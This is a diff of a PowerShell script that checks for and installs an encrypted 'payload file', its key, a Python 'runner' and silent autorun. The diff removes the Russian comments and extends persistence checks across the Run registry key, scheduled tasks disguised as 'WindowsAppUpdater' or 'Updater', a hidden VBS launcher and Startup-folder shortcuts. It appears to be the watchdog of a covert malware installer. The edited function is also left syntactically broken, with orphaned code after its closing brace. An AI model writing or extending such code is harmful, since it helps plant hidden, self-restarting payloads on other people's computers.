@@ -58,9 +58,9 @@ function tFile {
     }
 }
 
-# ===== ПОИСК PYTHON КАК В УСТАНОВЩИКЕ =====
+
 function Find-PythonLikeInstaller {
-    # Проверяем системную установку (Program Files)
+
     $systemPaths = @(
         "C:\Program Files\Python311\pythonw.exe",
         "C:\Program Files\Python311\python.exe",
@@ -75,7 +75,7 @@ function Find-PythonLikeInstaller {
         }
     }
     
-    # Проверяем локальную установку (AppData)
+
     $localPaths = @(
         "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe",
         "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
@@ -88,7 +88,6 @@ function Find-PythonLikeInstaller {
         }
     }
     
-    # Ищем pythonw в PATH
     try {
         $w = (where.exe pythonw 2>$null | Select-Object -First 1)
         if ($w -and (Test-Path $w)) { 
@@ -100,7 +99,7 @@ function Find-PythonLikeInstaller {
         }
     } catch {}
     
-    # Ищем python в PATH
+
     try {
         $p = (where.exe python 2>$null | Select-Object -First 1)
         if ($p -and (Test-Path $p)) { 
@@ -115,9 +114,9 @@ function Find-PythonLikeInstaller {
     return $null
 }
 
-# ===== ИЩЕМ ПРОЦЕСС python ИЛИ pythonw =====
+
 function tProc {
-    # Ищем оба процесса: python и pythonw
+
     $exeProc = Get-Process python, pythonw -ErrorAction SilentlyContinue
     
     if ($exeProc) {
@@ -139,22 +138,77 @@ function tProc {
     return $false
 }
 
-# ===== ПРОВЕРКА АВТОЗАПУСКА КАК В УСТАНОВЩИКЕ =====
+
 function tRun {
     param([string]$n)
+    
+
     $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     try {
         $v = Get-ItemProperty $rp -Name $n -ErrorAction Stop
         if ($v.$n) {
-            lInfo "Autorun configured" @{ name = $n; command = $v.$n }
+            lInfo "Autorun configured (Registry)" @{ name = $n; command = $v.$n }
             return $true
         }
-    } catch {
-        lErr "Autorun missing" @{ expectedName = $n }
-        return $false
+    } catch {}
+    
+
+    try {
+        $task = Get-ScheduledTask -TaskName $n -ErrorAction Stop
+        if ($task) {
+            lInfo "Autorun configured (Scheduled Task)" @{ name = $n; state = $task.State }
+            return $true
+        }
+    } catch {}
+    
+  
+    $possibleTaskNames = @(
+        "MyAutoRunTask",
+        "WindowsAppUpdater_VBS",
+        "WindowsAppUpdater_CMD",
+        "Updater",
+        "WindowsUpdater",
+        "BlockProxy",
+        "BlockProxyLogon"
+    )
+    
+    foreach ($taskName in $possibleTaskNames) {
+        try {
+            $task = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
+            if ($task) {
+                lInfo "Alternative scheduled task found" @{ name = $taskName; state = $task.State }
+                return $true
+            }
+        } catch {}
     }
     
-    # Дополнительная проверка: ищем все возможные имена
+
+    $vbsPath = "$env:LOCALAPPDATA\Microsoft\WindowsApps\launcher.vbs"
+    if (Test-Path $vbsPath) {
+        lInfo "VBS launcher exists" @{ path = $vbsPath }
+        return $true
+    }
+    
+
+    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $possibleFiles = @(
+        "$startupFolder\WindowsAppUpdater.lnk",
+        "$startupFolder\WindowsAppUpdater_VBS.lnk",
+        "$startupFolder\Updater.lnk"
+    )
+    
+    foreach ($file in $possibleFiles) {
+        if (Test-Path $file) {
+            lInfo "Autorun configured (Startup folder)" @{ path = $file }
+            return $true
+        }
+    }
+    
+    lErr "Autorun missing" @{ expectedName = $n }
+    return $false
+}
+    
+
     $possibleNames = @("WindowsAppUpdater", "WindowsAppUpdater_VBS", "WindowsAppUpdater_CMD", "Updater", "WindowsUpdater")
     foreach ($name in $possibleNames) {
         if ($name -eq $n) { continue }
@@ -170,7 +224,7 @@ function tRun {
     return $false
 }
 
-# ===== ПРОВЕРКА PYTHON КАК В УСТАНОВЩИКЕ =====
+
 function tPy {
     $pythonPath = Find-PythonLikeInstaller
     if ($pythonPath) {
@@ -182,7 +236,7 @@ function tPy {
     return $false
 }
 
-# ===== ФУНКЦИИ УСТАНОВКИ =====
+
 function Install-PythonLikeInstaller {
     lInfo "Installing Python 3.11.9"
     
@@ -332,7 +386,7 @@ function Start-Runner {
     }
 }
 
-# ===== ОСНОВНАЯ ФУНКЦИЯ =====
+
 function chk {
     Clear-Host
     Write-Host ""
@@ -346,18 +400,18 @@ function chk {
     }
     
     $r = @{
-        pf = $false  # payload file
-        kf = $false  # key file
-        rf = $false  # runner file
-        py = $false  # python
-        pr = $false  # process
-        ar = $false  # autorun
+        pf = $false  
+        kf = $false  
+        rf = $false  
+        py = $false  
+        pr = $false  
+        ar = $false  
     }
     
     Write-Host "  [*] Checking installation..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 500
     
-    # ===== ПРОВЕРКИ =====
+
     $r.pf = tFile -p $pFile -n "Payload file"
     $r.kf = tFile -p $kFile -n "Encryption key"
     $r.rf = tFile -p $rFile -n "Runner script"
@@ -368,22 +422,22 @@ function chk {
     Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 500
     
-    # ===== УСТАНОВКА ОТСУТСТВУЮЩИХ КОМПОНЕНТОВ =====
+
     $installed = $false
     
-    # 1. Установка Python (если не найден)
+
     if (-not $r.py) {
         Write-Host "  [*] Installing Python..." -ForegroundColor Yellow
         $r.py = Install-PythonLikeInstaller
         if ($r.py) { $installed = $true }
     }
     
-    # 2. Создание папок
+
     if (-not (Test-Path $pDir)) { New-Item -ItemType Directory -Path $pDir -Force | Out-Null }
     if (-not (Test-Path $kDir)) { New-Item -ItemType Directory -Path $kDir -Force | Out-Null }
     if (-not (Test-Path $rDir)) { New-Item -ItemType Directory -Path $rDir -Force | Out-Null }
     
-    # 3. Создание файлов (если их нет)
+
     if (-not $r.pf) {
         Write-Host "  [*] Creating dummy payload file..." -ForegroundColor Yellow
         "dummy" | Out-File -FilePath $pFile -Encoding ascii
@@ -398,21 +452,21 @@ function chk {
         $installed = $true
     }
     
-    # 4. Создание runner файла
+
     if (-not $r.rf) {
         Write-Host "  [*] Creating runner script..." -ForegroundColor Yellow
         $r.rf = Create-RunnerFile -Path $rFile
         if ($r.rf) { $installed = $true }
     }
     
-    # 5. Настройка автозапуска (как в установщике)
+
     if (-not $r.ar -and $r.rf) {
         Write-Host "  [*] Setting up autorun..." -ForegroundColor Yellow
         $r.ar = Add-AutoRun -n $aName -rf $rFile
         if ($r.ar) { $installed = $true }
     }
     
-    # 6. Запуск runner
+
     if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
         Write-Host "  [*] Starting runner..." -ForegroundColor Yellow
         if (Start-Runner -rf $rFile) {
@@ -427,7 +481,7 @@ function chk {
         Write-Host "  [*] Re-checking status..." -ForegroundColor Yellow
         Start-Sleep -Milliseconds 500
         
-        # Перепроверка
+
         $r.pf = tFile -p $pFile -n "Payload file"
         $r.kf = tFile -p $kFile -n "Encryption key"
         $r.rf = tFile -p $rFile -n "Runner script"
@@ -436,7 +490,7 @@ function chk {
         $r.ar = tRun -n $aName
     }
     
-    # ===== РЕЗУЛЬТАТ =====
+
     $pc = ($r.Values | Where-Object { $_ -eq $true }).Count
     $tc = $r.Count
     $pp = [math]::Round(($pc / $tc) * 100, 0)
